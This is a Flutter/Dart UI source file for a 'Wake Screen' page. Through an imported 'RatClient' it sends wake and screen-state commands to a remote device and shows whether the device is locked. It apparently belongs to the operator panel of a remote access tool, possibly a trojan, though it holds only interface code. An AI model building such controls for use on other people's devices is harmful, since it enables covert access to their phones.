import 'dart:async';

import 'package:flutter/material.dart';

import 'rat_client.dart';
import '../theme/neo.dart';

class WakeScreenPage extends StatefulWidget {
  final RatClient client;
  final String deviceId;
  const WakeScreenPage({super.key, required this.client, required this.deviceId});

  @override
  State<WakeScreenPage> createState() => _WakeScreenPageState();
}

class _WakeScreenPageState extends State<WakeScreenPage>
    with SingleTickerProviderStateMixin {
  late final AnimationController _pulseCtrl;
  late final Animation<double> _pulseAnim;
  bool _waking = false;
  bool _checking = false;
  final List<_WakeLogEntry> _log = [];
  final ScrollController _logScroll = ScrollController();

  RatClient get client => widget.client;
  String get deviceId => widget.deviceId;

  dynamic get _screenState => client.dataFor(deviceId)['screenState'];

  String get _screenLabel {
    final s = _screenState;
    if (s == null) return 'UNKNOWN';
    if (s is Map) {
      final screen = s['screen'];
      final locked = s['locked'];
      if (screen == false || screen == 'OFF') return 'OFF';
      if (locked == true) return 'LOCKED';
      return 'ON';
    }
    final str = s.toString().toLowerCase();
    if (str.contains('off')) return 'OFF';
    if (str.contains('lock')) return 'LOCKED';
    if (str.contains('on')) return 'ON';
    return str.toUpperCase();
  }

  Color get _screenColor {
    switch (_screenLabel) {
      case 'ON':
        return Neo.mint;
      case 'LOCKED':
        return Neo.peach;
      case 'OFF':
        return Neo.coral;
      default:
        return Neo.textMuted;
    }
  }

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.6, end: 1.0).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut),
    );
    client.addListener(_onClient);
  }

  @override
  void dispose() {
    client.removeListener(_onClient);
    _pulseCtrl.dispose();
    _logScroll.dispose();
    super.dispose();
  }

  void _onClient() {
    if (!mounted) return;
    setState(() {});
  }

  void _addLog(String action, String status) {
    final now = DateTime.now();
    final ts =
        '${now.hour.toString().padLeft(2, '0')}:'
        '${now.minute.toString().padLeft(2, '0')}:'
        '${now.second.toString().padLeft(2, '0')}';
    setState(() {
      _log.insert(0, _WakeLogEntry(time: ts, action: action, status: status));
      if (_log.length > 50) _log.removeLast();
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScroll.hasClients) {
        _logScroll.jumpTo(0);
      }
    });
  }

  Future<void> _wakeScreen() async {
    if (_waking) return;
    setState(() => _waking = true);
    try {
      final res = await client.sendCommand(deviceId, 'wakeScreen', '');
      if (res.statusCode == 200) {
        _addLog('WAKE', 'SENT');
        _toast('Wake command sent');
      } else {
        _addLog('WAKE', 'FAIL ${res.statusCode}');
        _toast('Failed: ${res.statusCode}', error: true);
      }
    } catch (e) {
      _addLog('WAKE', 'ERROR');
      _toast('Error: $e', error: true);
    }
    if (mounted) setState(() => _waking = false);
  }

  Future<void> _checkScreenState() async {
    if (_checking) return;
    setState(() => _checking = true);
    try {
      final res = await client.sendCommand(deviceId, 'getScreenState', '');
      if (res.statusCode == 200) {
        _addLog('CHECK', 'SENT');
        _toast('Check command sent');
      } else {
        _addLog('CHECK', 'FAIL ${res.statusCode}');
        _toast('Failed: ${res.statusCode}', error: true);
      }
    } catch (e) {
      _addLog('CHECK', 'ERROR');
      _toast('Error: $e', error: true);
    }
    if (mounted) setState(() => _checking = false);
  }

  void _toast(String msg, {bool error = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context)
      ..clearSnackBars()
      ..showSnackBar(SnackBar(
        content: Text(msg,
            style: const TextStyle(
                fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark)),
        backgroundColor: error ? Neo.coral : Neo.mint,
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 2),
      ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Neo.mint, size: 20),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text('WAKE SCREEN',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 14,
                fontWeight: FontWeight.w700,
                letterSpacing: 2,
                color: Neo.mint)),
        centerTitle: true,
      ),
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          return SingleChildScrollView(
            padding: const EdgeInsets.fromLTRB(20, 8, 20, 24),
            child: Column(
              children: [
                const SizedBox(height: 24),
                _buildScreenIndicator(),
                const SizedBox(height: 32),
                _buildWakeButton(),
                const SizedBox(height: 16),
                _buildCheckButton(),
                const SizedBox(height: 32),
                _buildScreenStateCard(),
                const SizedBox(height: 20),
                _buildLogSection(),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildScreenIndicator() {
    return Column(
      children: [
        AnimatedBuilder(
          animation: _pulseAnim,
          builder: (context, child) {
            return Container(
              width: 120,
              height: 120,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _screenColor.withValues(alpha: 0.08),
                border: Border.all(
                  color: _screenColor.withValues(alpha: 0.3),
                  width: 2,
                ),
                boxShadow: [
                  BoxShadow(
                    color: _screenColor
                        .withValues(alpha: 0.15 * _pulseAnim.value),
                    blurRadius: 30 * _pulseAnim.value,
                    spreadRadius: -4,
                  ),
                ],
              ),
              child: Center(
                child: Icon(
                  _screenLabel == 'OFF'
                      ? Icons.screen_lock_portrait
                      : _screenLabel == 'LOCKED'
                          ? Icons.lock_outline
                          : Icons.phone_android,
                  size: 40,
                  color: _screenColor,
                ),
              ),
            );
          },
        ),
        const SizedBox(height: 14),
        Text(
          _screenLabel,
          style: TextStyle(
            fontFamily: 'ShareTechMono',
            fontSize: 16,
            fontWeight: FontWeight.w700,
            letterSpacing: 3,
            color: _screenColor,
          ),
        ),
        const SizedBox(height: 4),
        Text(
          'CURRENT STATE',
          style: TextStyle(
            fontFamily: 'ShareTechMono',
            fontSize: 9,
            letterSpacing: 2,
            color: Neo.textMuted,
          ),
        ),
      ],
    );
  }

  Widget _buildWakeButton() {
    return GestureDetector(
      onTap: _waking ? null : _wakeScreen,
      child: AnimatedBuilder(
        animation: _pulseAnim,
        builder: (context, child) {
          return Container(
            width: double.infinity,
            height: 80,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              color: _waking
                  ? Neo.cream
                  : Neo.mint.withValues(alpha: 0.12),
              border: Border.all(
                color: _waking
                    ? Neo.textMuted
                    : Neo.mint.withValues(alpha: 0.4),
                width: 2.5,
              ),
              boxShadow: _waking
                  ? []
                  : [
                      BoxShadow(
                        color: Neo.mint.withValues(
                            alpha: 0.12 * _pulseAnim.value),
                        blurRadius: 24 * _pulseAnim.value,
                        spreadRadius: -4,
                      ),
                    ],
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                if (_waking)
                  const SizedBox(
                    width: 22,
                    height: 22,
                    child: CircularProgressIndicator(
                      strokeWidth: 2.5,
                      color: Neo.textMuted,
                    ),
                  )
                else
                  Icon(
                    Icons.power_settings_new,
                    size: 30,
                    color: Neo.mint.withValues(
                        alpha: 0.5 + 0.5 * _pulseAnim.value),
                  ),
                const SizedBox(width: 14),
                Text(
                  _waking ? 'SENDING...' : 'WAKE SCREEN',
                  style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 16,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 3,
                    color: _waking ? Neo.textMuted : Neo.mint,
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildCheckButton() {
    return GestureDetector(
      onTap: _checking ? null : _checkScreenState,
      child: Container(
        width: double.infinity,
        height: 56,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          color: Neo.white,
          border: Border.all(
            color: Neo.sky.withValues(alpha: 0.3),
            width: 2,
          ),
          boxShadow: Neo.shadow(offset: 2),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            if (_checking)
              const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: Neo.textMuted,
                ),
              )
            else
              const Icon(Icons.info_outline, size: 20, color: Neo.sky),
            const SizedBox(width: 10),
            Text(
              _checking ? 'CHECKING...' : 'CHECK SCREEN STATE',
              style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 13,
                fontWeight: FontWeight.w700,
                letterSpacing: 2,
                color: _checking ? Neo.textMuted : Neo.sky,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildScreenStateCard() {
    final state = _screenState;
    return NeoCard(
      borderColor: _screenColor.withValues(alpha: 0.3),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _screenColor,
                  boxShadow: [
                    BoxShadow(color: _screenColor, blurRadius: 6)
                  ],
                ),
              ),
              const SizedBox(width: 10),
              const Text('SCREEN STATUS',
                  style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 11,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 2,
                      color: Neo.textDark)),
            ],
          ),
          const SizedBox(height: 12),
          if (state == null)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Neo.cream,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: Neo.textMuted, width: 1),
              ),
              child: const Text(
                'NO DATA YET\nPRESS CHECK SCREEN STATE TO QUERY',
                textAlign: TextAlign.center,
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 10,
                    letterSpacing: 1,
                    height: 1.6,
                    color: Neo.textMuted),
              ),
            )
          else ...[
            _infoRow('SCREEN',
                Text(_screenLabel,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 14,
                        fontWeight: FontWeight.w700,
                        color: _screenColor))),
            const SizedBox(height: 6),
            if (state is Map) ...[
              for (final entry in state.entries)
                _infoRow(
                    entry.key.toString().toUpperCase(),
                    Text(entry.value.toString(),
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                            fontWeight: FontWeight.w600,
                            color: Neo.sky))),
            ] else
              _infoRow('RAW',
                  Text(state.toString(),
                      style: const TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 11,
                          color: Neo.sky))),
          ],
        ],
      ),
    );
  }

  Widget _infoRow(String label, Widget value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 9,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 1,
                  color: Neo.textMuted)),
          value,
        ],
      ),
    );
  }

  Widget _buildLogSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Row(
          children: [
            Container(
              width: 3,
              height: 14,
              decoration: BoxDecoration(
                color: Neo.mint,
                borderRadius: BorderRadius.circular(1),
                boxShadow: [
                  BoxShadow(color: Neo.mint.withValues(alpha: 0.4), blurRadius: 6)
                ],
              ),
            ),
            const SizedBox(width: 10),
            const Text('WAKE HISTORY',
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    color: Neo.textMuted)),
          ],
        ),
        const SizedBox(height: 10),
        Container(
          height: 200,
          decoration: BoxDecoration(
            color: const Color(0xFF040E08),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(
              color: Neo.mint.withValues(alpha: 0.15),
              width: 1,
            ),
          ),
          child: _log.isEmpty
              ? const Center(
                  child: Text(
                    'NO HISTORY',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 9,
                        letterSpacing: 2,
                        color: Neo.textMuted),
                  ),
                )
              : ListView.builder(
                  controller: _logScroll,
                  padding: const EdgeInsets.all(10),
                  itemCount: _log.length,
                  itemBuilder: (context, i) {
                    final e = _log[i];
                    final isWake = e.action == 'WAKE';
                    final isError =
                        e.status.contains('FAIL') || e.status.contains('ERROR');
                    return Padding(
                      padding: const EdgeInsets.symmetric(vertical: 3),
                      child: Row(
                        children: [
                          Text(e.time,
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 9,
                                  color: Neo.textMuted)),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 5, vertical: 1),
                            decoration: BoxDecoration(
                              color: isWake
                                  ? Neo.mint.withValues(alpha: 0.12)
                                  : Neo.sky.withValues(alpha: 0.12),
                              borderRadius: BorderRadius.circular(3),
                              border: Border.all(
                                color: isWake
                                    ? Neo.mint.withValues(alpha: 0.3)
                                    : Neo.sky.withValues(alpha: 0.3),
                                width: 1,
                              ),
                            ),
                            child: Text(e.action,
                                style: TextStyle(
                                    fontFamily: 'ShareTechMono',
                                    fontSize: 8,
                                    fontWeight: FontWeight.w700,
                                    color: isWake ? Neo.mint : Neo.sky)),
                          ),
                          const SizedBox(width: 8),
                          Text(e.status,
                              style: TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 9,
                                  fontWeight: FontWeight.w600,
                                  color: isError ? Neo.coral : Neo.textDark)),
                        ],
                      ),
                    );
                  },
                ),
        ),
      ],
    );
  }
}

class _WakeLogEntry {
  final String time;
  final String action;
  final String status;
  const _WakeLogEntry({
    required this.time,
    required this.action,
    required this.status,
  });
}
